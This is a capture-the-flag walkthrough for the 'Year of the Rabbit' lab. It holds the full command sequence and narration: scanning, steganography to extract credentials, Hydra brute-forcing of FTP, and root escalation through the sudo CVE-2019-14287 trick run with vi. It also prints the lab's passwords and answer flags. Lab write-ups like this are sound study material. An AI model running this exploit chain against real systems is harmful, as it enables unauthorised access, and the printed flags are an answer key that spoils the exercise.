# Year of the Rabbit - Easy

```shell
rustscan -a 10.10.128.186 --range 0-65535 --ulimit 5000 -- -sV

feroxbuster -u http://10.10.128.186 -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf,zip --extract-links --scan-limit 2 --filter-status 401,403,404,405,500 --silent

#use stego tools on downloaded image
exiftool Hot_Babe.png
#exiftool includes a warning, there could be a clue inside

zsteg -a Hot_Babe.png
#this gives us the username for ftp
#and a set of passwords

strings Hot_Babe.png
#this lists all the possible passwords

vim ftp_pass.txt
#copy all passwords

hydra -l ftpuser -P ftp_pass.txt 10.10.128.186 ftp
#cracks the password

ftp 10.10.128.186
#login as ftpuser
#and get the .txt file

#use eli creds
ssh eli@10.10.128.186

ls -la

find / -name s3cr3t 2>/dev/null

ls -la /usr/games/s3cr3t

cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
#contains another set of creds

su gwendoline

cd /home/gwendoline

cat user.txt

cd /tmp
#get linpeas.sh from attacker machine and make it an executable

./linpeas.sh

sudo -l

sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
#use user id -1 for CVE-2019-14287

#in vi
:!sh

#we get root shell
id

cat /root/root.txt
```

```markdown
Open ports & services:

  * 21 - ftp - vsftpd 3.0.2
  * 22 - ssh - OpenSSH 6.7p1
  * 80 - http - Apache httpd 2.4.10 (Debian)

We can try for ftp anonymous login but it does not work.

We can start by exploring the website, and using feroxbuster we can enumerate the web directories in the background.

/assets does not contain anything useful, and we cannot access /icons.

Feroxbuster picks up an image file at /icons/openlogo-75.png; we can download that and check for any hidden clues.

The image file does not reveal anything; so we can check for other routes.

The CSS stylesheet contains /sup3r_s3cr3t_fl4g.php, but it is just a RickRoll.

The page does alert us to turn off JavaScript, so we can give that a try.

We are greeted with a message and a video, which is again a RickRoll.

Navigating back to the home page, we can try to use Burp Suite to check for any hidden headers or clues.

Navigating back to /sup3r_s3cr3t_fl4g.php, this time capturing the requests on Burp Suite, we can notice that there is a /intermediary.php which redirects to /sup3r_s3cr3t_fl4g.php.

Furthermore, the /intermediary.php request contains a hidden directory /WExYY2Cv-qU

Checking /WExYY2Cv-qU gives us an image file which can be downloaded and checked for any more clues.

Using zsteg, we can get the ftp username is ftpuser; it also gives us a set of possible passwords.

Using strings, we can get a clear list of passwords, we can copy those to a wordlist and try brute-forcing ftp using Hydra.

With the help of Hydra, we get the creds ftpuser:5iez1wGXKfPKQ

Logging into ftp, we have a .txt file with creds; on viewing it, it seems to be written in an esoteric language.

With the help of online Brainfuck decoder, we get the plaintext containing the creds eli:DSpDiM1wAEwid

We can login to SSH as eli now; on login we are greeted with the following message:

    Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there

We can look for 's3cr3t' using find; we get a location, and there we can find creds for another user - Gwendoline:MniVCQVhQHUNI

We can switch to this user, and grab the user flag from their home directory.

Now, we can use linpeas.sh for privesc; using 'sudo -l' we can find that we can run the following command as all users except root:

    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt

This allows us to edit the user flag using vi.

More importantly, this contains '!root', which can be exploited using CVE-2019-14287 - this can be found out by Googling 'sudo -l cannot run as root'

Now, we can use this CVE for exploitation and get root flag.
```

1. What is the user flag? - THM{1107174691af9ff3681d2b5bdb5740b1589bae53}

2. What is the root flag? - THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
